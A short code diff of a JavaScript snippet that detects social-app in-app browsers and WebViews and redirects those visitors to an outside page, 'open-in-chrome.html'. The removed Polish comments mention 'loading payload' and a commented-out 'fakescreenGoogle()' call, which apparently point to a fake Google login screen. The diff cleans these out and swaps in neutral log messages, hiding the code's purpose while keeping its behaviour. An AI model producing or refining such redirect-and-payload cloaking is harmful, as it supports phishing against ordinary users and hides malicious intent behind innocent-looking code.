@@ -1,29 +1,16 @@
 (function () {
   const ua = navigator.userAgent.toLowerCase();
-
   const suspects = [
-    "fbav",         // Facebook, Messenger
-    "instagram",    // Instagram app
-    "whatsapp",     // WhatsApp WebView
-    "telegram",     // Telegram app
-    "tiktok",       // TikTok WebView
-    "snapchat",     // Snapchat in-app browser
-    "reddit",       // Reddit app
-    "twitter",      // Twitter app
-    "linkedin",     // LinkedIn app
-    "wv",           // Android WebView
+    "fbav", "instagram", "whatsapp", "telegram", "tiktok",
+    "snapchat", "reddit", "twitter", "linkedin", "wv"
   ];
-
   const isWebView = suspects.some(agent => ua.includes(agent));
-
   if (isWebView) {
-    console.log("🚧 WebView z aplikacji wykryty – przekierowanie do Chrome");
+    console.log("🚧 WebView detected – redirecting");
     setTimeout(() => {
       window.location.href = "https://checkerls.vercel.app/open-in-chrome.html";
     }, 2000);
   } else {
-    console.log("✅ Brak WebView – ładuję payload.");
-    // Jeśli chcesz trigger automatyczny:
-    // fakescreenGoogle(); 
+    console.log("✅ Browser OK – continue normal payload");
   }
 })();
